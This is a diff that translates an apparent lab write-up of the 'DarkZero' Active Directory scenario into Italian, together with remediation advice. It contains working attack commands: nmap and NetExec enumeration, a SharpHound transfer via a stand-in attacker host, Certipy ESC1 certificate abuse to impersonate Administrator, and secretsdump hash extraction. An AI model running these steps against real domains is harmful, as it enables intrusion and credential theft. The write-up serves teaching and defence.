@@ -1,18 +1,18 @@
-# Lab Assessment: "DarkZero" Scenario
+# Esercitazione di Laboratorio: Scenario "DarkZero"
 
-> **Task Context:** This document represents the outcome of a practical **Active Directory & Infrastructure Penetration Testing** assessment conducted on an enterprise-like Windows domain. The objective is the application of the **OSSTMM (Open Source Security Testing Methodology Manual)** methodology for the systematic assessment of AD infrastructures, MS-SQL, and certificate-based authentication mechanisms. The scenario simulates a penetration test on an AD domain with a focus on escalation paths and lateral movement.
+> **Contesto dell'attività:** Questo documento rappresenta il risultato di un'esercitazione pratica di **Active Directory & Infrastructure Penetration Testing** condotta su un dominio Windows enterprise-like. L'obiettivo è l'applicazione della metodologia **OSSTMM (Open Source Security Testing Methodology Manual)** per l'assessment sistematico di infrastrutture AD, MS-SQL, e certificate-based authentication mechanisms. Lo scenario simula un penetration test su dominio AD con focus su escalation paths e lateral movement.
 
-**Assessment Date:** October 2025  
+**Data Assessment:** Ottobre 2025  
 **Target Environment:** Windows Server 2019+ with Active Directory + MS-SQL Server 2022  
-**Assessment Type:** Infrastructure Pentest Simulation (AD-focused)  
+**Assessment Type:** Simulazione Infrastructure Pentest (AD-focused)  
 **Overall Risk Severity:** CRITICAL 🔴  
-**Applied Methodology:** OSSTMM v3 + PTES + NIST SP 800-115  
+**Metodologia Applicata:** OSSTMM v3 + PTES + NIST SP 800-115  
 
 ---
 
 ## 1. Executive Summary
 
-During this simulated assessment, an Active Directory infrastructure was compromised starting from standard user credentials (with limited initial access). Through the orchestration of:
+Durante questo assessment simulato, è stata compromessa un'infrastruttura Active Directory partendo da credenziali di utente standard (con accesso iniziale limitato). Attraverso l'orchestrazione di:
 
 1. **Active Directory Enumeration** (LDAP, Kerberos, SMB)
 2. **MS-SQL Reconnaissance** (Database services, credentials)
@@ -20,20 +20,20 @@ During this simulated assessment, an Active Directory infrastructure was comprom
 4. **Certificate-Based Escalation** (Certipy exploitation)
 5. **Privilege Escalation via Misconfigured AD CS**
 
-it was possible to achieve Domain Administrator access, fully compromising the infrastructure.
+è stato possibile raggiungere Domain Administrator access, compromettendo completamente l'infrastruttura.
 
 **CVSS v3.1 Base Score: 9.9 (CRITICAL)**
 - Vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
-- Impact: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)
-- Notes: Requires initial credentials (low-privileged user) but allows for Domain Admin takeover
+- Impatto: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)
+- Note: Richiede credenziali iniziali (low-privileged user), ma permette Domain Admin takeover
 
 ---
 
-## 2. Applied Methodology
+## 2. Metodologia Applicata
 
-### 2.1 Reference Frameworks
+### 2.1 Framework di Reference
 
-The assessment followed these guidelines:
+L'assessment ha seguito le seguenti linee guida:
 
 - **OSSTMM (Open Source Security Testing Methodology Manual) v3**
   - Section 5: Interaction Testing (Network)
@@ -52,9 +52,9 @@ The assessment followed these guidelines:
   - Vulnerability Analysis (Misconfigured AD CS, weak permissions)
   - Exploitation (Certificate request, token forging)
 
-### 2.2 Engagement Scope
+### 2.2 Scope dell'Engagement
 
-**Objective:** Full domain compromise starting from a standard user  
+**Objective:** Full domain compromise partendo da utente standard  
 **Starting Point:** Valid AD credentials (limited user)  
 **Targets:** Active Directory, MS-SQL, Certificate Services (AD CS)  
 **Assessment Scope:** Network-wide (no air-gap assumed)
@@ -89,18 +89,18 @@ The assessment followed these guidelines:
 
 ---
 
-## 4. Proof of Concept (PoC) & Technical Evidence
+## 4. Proof of Concept (PoC) ed Evidenze Tecniche
 
 ### 4.1 Network Exploration & Service Discovery
 
 #### **Nmap Enumeration**
 
-**Executed Command:**
+**Comando eseguito:**
 ```bash
 sudo nmap -A -p- --open -Pn -T4 10.129.115.150 -oA darkzero_full
 ```
 
-**Critical Result:**
+**Risultato Critico:**
 ```
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
@@ -139,7 +139,7 @@ From Nmap SSL-CERT: commonName=DC01.darkzero.htb
 
 #### **NetExec LDAP Enumeration**
 
-**Command:**
+**Comando:**
 ```bash
 netexec ldap 10.129.115.150 -u <user> -p <password> --users
 ```
@@ -170,7 +170,7 @@ Mailserver: mail.darkzero.htb
 Nameserver: DC01.darkzero.htb
 ```
 
-**Observation:** Enterprise-like infrastructure with distributed services. Remote access available, no air-gap.
+**Observation:** Infrastruttura enterprise-like con services distribuiti. Acceso remoto disponibile, nessuna air-gap.
 
 ---
 
@@ -178,12 +178,12 @@ Nameserver: DC01.darkzero.htb
 
 #### **Sharphound Data Collection**
 
-To obtain a complete view of the directory structure and identify non-obvious attack paths, we use **Sharphound** (Bloodhound's collector for AD):
+Per ottenere una veduta completa della directory structure e identificare attack paths non ovvi, utilizziamo **Sharphound** (collector di Bloodhound per AD):
 
 ```bash
-# On target Windows machine (with standard user privileges)
+# On target Windows machine (con privilegio di utente standard)
 Sharphound.exe -c All -o output.zip
-# Produces: output.zip containing CSVs of users, computers, permissions, ACLs
+# Produce: output.zip contente CSV di users, computers, permissions, ACLs
 
 # Transfer to attacker machine
 Invoke-WebRequest -Uri "http://<attacker>:8000/output.zip" -OutFile "output.zip"
@@ -191,7 +191,7 @@ Invoke-WebRequest -Uri "http://<attacker>:8000/output.zip" -OutFile "output.zip"
 
 #### **Bloodhound Analysis**
 
-Importing the Sharphound output into Bloodhound (graph database visualizer):
+Importare l'output di Sharphound in Bloodhound (graph database visualizer):
 
 ```bash
 sudo neo4j console  # Start graph database
@@ -231,7 +231,7 @@ netexec mssql 10.129.115.150 -u sqlservice -p <password> --sam
 # Outputs SAM database if RDP/Shell access via SQL
 ```
 
-**Finding:** SQL Server runs under the **sqlservice** account (high-privilege service account), potentially with AD CS enrollment permissions.
+**Finding:** SQL Server runs under **sqlservice** account (high-privilege service account), potentially with AD CS enrollment permissions.
 
 ---
 
@@ -239,7 +239,7 @@ netexec mssql 10.129.115.150 -u sqlservice -p <password> --sam
 
 #### **Certipy Reconnaissance**
 
-**Certipy** is a specialized tool for the enumeration and exploitation of AD Certificate Services (PKI):
+**Certipy** è uno strumento specializzato per l'enumeration e l'exploitation di AD Certificate Services (PKI):
 
 ```bash
 certipy find -u <user>@darkzero.htb -p <password> -dc-ip 10.129.115.150 -output output.json
@@ -282,7 +282,7 @@ certipy find -u <user>@darkzero.htb -p <password> -dc-ip 10.129.115.150 -output 
 - ✓ Template allows Server Authentication (dangerous for user certs)
 - ✓ Overly permissive enrollment: "Everyone: Enroll"
 - ✓ Subject Alternative Name allows arbitrary user/computer names
-- ✗ Requires enrollment approval: NO (automatic approval)
+- ✗ Requires enrollment approval: NO (autorematic approval)
 
 ---
 
@@ -290,7 +290,7 @@ certipy find -u <user>@darkzero.htb -p <password> -dc-ip 10.129.115.150 -output 
 
 #### **Step 1: Request Certificate as Domain Admin**
 
-Leveraging the vulnerable "Admin" template, we request a valid certificate for the **DOMAIN ADMIN** user:
+Sfruttando la template "Admin" vulnerabile, richiediamo un certificato valido per l'utente **DOMAIN ADMIN**:
 
 ```bash
 certipy req -u <user>@darkzero.htb -p <password> \
@@ -309,13 +309,13 @@ certipy req -u <user>@darkzero.htb -p <password> \
 [*] Certificate saved: admin.pfx
 ```
 
-**Significance:** We have a valid X.509 certificate for the Administrator user, signed by the domain CA.
+**Significance:** Abbiamo un certificato X.509 valido per l'utente Administrator, firmato dalla CA del domino.
 
 ---
 
 #### **Step 2: Convert Certificate to Kerberos TGT**
 
-Once the certificate is obtained, we can convert it into a Kerberos Ticket Granting Ticket (TGT) that allows us to impersonate Administrator:
+Una volta ottenuto il certificato, possiamo convertirlo in un Kerberos Ticket Granting Ticket (TGT) che ci permite di impersonare Administrator:
 
 ```bash
 certipy auth -pfx admin.pfx -username Administrator \
@@ -335,10 +335,10 @@ certipy auth -pfx admin.pfx -username Administrator \
 
 #### **Step 3: Use TGT for Domain Admin Access**
 
-The newly obtained TGT ticket can be used to access any Kerberos service in the domain as Administrator:
+Il ticket TGT appena ottenuto può essere utilizzato per accedere a qualunque servizio Kerberos del dominio come Administrator:
 
 ```bash
-# Export ccache for subsequent use
+# Export ccache per utilizzo successivo
 export KRB5CCNAME=/path/to/TGT_Administrator.ccache
 
 # Access domain resources as Administrator
@@ -347,7 +347,7 @@ secretsdump.py -k -no-pass Administrator@DC01.darkzero.htb
 # Output: NTLM hashes of all domain users (full compromise)
 ```
 
-**Final Result:** Domain Admin (Administrator) access achieved. The domain is completely compromised.
+**Risultato Finale:** Domain Admin (Administrator) access ottenuto. Il dominio è completamente compromesso.
 
 ---
 
@@ -356,27 +356,27 @@ secretsdump.py -k -no-pass Administrator@DC01.darkzero.htb
 #### **Root/System Flag**
 
 ```bash
-# Access as Administrator to the DC
-# Catching the flags
+# Accesso as Administrator al DC
+# Recupero dei flags
 
 # User Flag (typically in non-admin user's home):
 type C:\Users\<user>\Desktop\user.txt
 
 # Root Flag (System flag):
 type C:\Users\Administrator\Desktop\root.txt
-# OR
+# O
 type C:\Windows\System32\flag.txt  (if accessible)
 ```
 
 ---
 
-## 5. Remediation & Hardening (Proposals)
+## 5. Remediation & Hardening (Proposte)
 
-### 5.1 Mitigation of Identified Vulnerabilities
+### 5.1 Mitigazione delle Vulnerabilità Identificate
 
-#### **5.1.1 AD Certificate Services (AD CS) – ESC1 & ESC7 Remediation**
+#### **5.1.1 AD Certificate Services (AD CS) – ESC1 & ESC7 Remediazione**
 
-**Primary Remediation – Disable vulnerable templates:**
+**Remediazione Primaria – Disabilitare template vulnerabili:**
 
 ```powershell
 # In Certificate Authority Manager (certsrv.msc):
@@ -386,9 +386,9 @@ type C:\Windows\System32\flag.txt  (if accessible)
 # 4. Properties → Issuance Requirements → Require "Manager Approval"
 ```
 
-**Secure Template Criteria:**
+**Criteri di Template Sicura:**
 
-| Parameter | Vulnerable | Secure |
+| Parametro | Vulnerabile | Sicuro |
 |-----------|---|---|
 | Enrollment Permission | Everyone | Only specific groups (e.g., Domain Admins) |
 | Subject Alt Name | User + Computer names | Only DNS (computer-centric) |
@@ -403,7 +403,7 @@ type C:\Windows\System32\flag.txt  (if accessible)
 
 #### **5.1.2 LDAP & Kerberos Hardening**
 
-**Primary Remediation:**
+**Remediazione Primaria:**
 
 ```powershell
 # Group Policy: Enforce Kerberos Pre-authentication
@@ -415,15 +415,15 @@ type C:\Windows\System32\flag.txt  (if accessible)
 ```
 
 **Additional Hardening:**
-- Implement **Kerberos Armored Pre-authentication** (for anti-replay protection)
-- Disable legacy LAN Manager hashing
-- Implement conditional access policies (MFA for sensitive accounts)
+- Implementare **Kerberos Armored Pre-authentication** (for anti-replay protection)
+- Disabilitare legacy LAN Manager hashing
+- Implementare conditional access policies (MFA per account sensibili)
 
 ---
 
 #### **5.1.3 MS-SQL Service Account Least Privilege**
 
-**Primary Remediation – Revoke AD CS Enrollment Rights:**
+**Remediazione Primaria – Revoke AD CS Enrollment Rights:**
 
 ```powershell
 # In Active Directory Users and Computers:
@@ -445,7 +445,7 @@ type C:\Windows\System32\flag.txt  (if accessible)
 
 #### **5.1.4 Network Segmentation & Monitoring**
 
-**Remediation – Implement Microsegmentation:**
+**Remediazione – Implement Microsegmentation:**
 
 ```
 AD Domain Controllers:
@@ -471,7 +471,7 @@ SQL Services:
 | Framework | Control | Current State | Remediation |
 |-----------|---------|---|---|
 | **OSSTMM 5.3** | LDAP Access Control | Overly permissive | Restrict enrollment permissions |
-| **NIST 800-115 TS-2.4.1** | Account Privilege Testing | Service accounts over-privileged | Apply Least Privilege principle |
+| **NIST 800-115 TS-2.4.1** | Account Privilege Testing | Service accounts over-privileged | Apply Least Privilege princip |
 | **NIST 800-115 TS-3.2** | Vulnerability Analysis | Misconfigured AD CS | Fix template enrollment rules |
 | **CIS Benchmark Level 2** | Kerberos Hardening | Legacy settings enabled | Update to modern TLS/encryption |
 
@@ -490,19 +490,19 @@ SQL Services:
 
 ---
 
-## 6. Conclusions
+## 6. Conclusioni
 
-This assessment demonstrated how an Active Directory infrastructure with **multiple misconfigurations** can be completely compromised starting from low-privileged user credentials:
+Questo assessment ha dimostrato come un'infrastruttura Active Directory con **multiple misconfigurations** può essere completamente compromessa partendo da credenziali di utente low-privileged:
 
-1. **AD CS ESC1 misconfiguration** → The main vector for escalation
-2. **Overly permissive enrollment rights** → Allows requesting a cert for an admin
-3. **Service account over-privileged** → Credential stored in SQL, used for escalation
-4. **Lack of monitoring/alerting** → No detection of lateral movement
+1. **AD CS ESC1 misconfiguration** → Il vettore principale di escalation
+2. **Overly permissive enrollment rights** → Consente richiesta cert per admin
+3. **Service account over-privileged** → Credential stored in SQL, usato per escalation
+4. **Mancanza di monitoring/alerting** → Nessun rilevamento della laterale movement
 
-The implementation of the proposed remediations – especially AD CS hardening, the application of Least Privilege, and the deployment of monitoring – would significantly reduce the attack surface.
+L'implementazione delle remediazioni proposte – specialmente il hardening di AD CS, l'applicazione del Least Privilege, e il deployment di monitoring – ridurrebbe la superficie di attacco in modo significativo.
 
 ---
 
-**Final Notes:**
+**Note Finali:**
 
-An AD infrastructure without AD CS hardening is practically compromised out of the box. ESC1/ESC7 are almost "plug and play" exploits once you find the vulnerable template. The very first thing we look at in any AD assessment is the PKI.
+Un'infrastruttura AD senza hardening dei AD CS è praticamente compromessa. ESC1/ESC7 sono exploit quasi "plug and play" una volta che trovi la template vulnerabile. La prima cosa che guardiamo in qualunque AD assessment è la PKI.
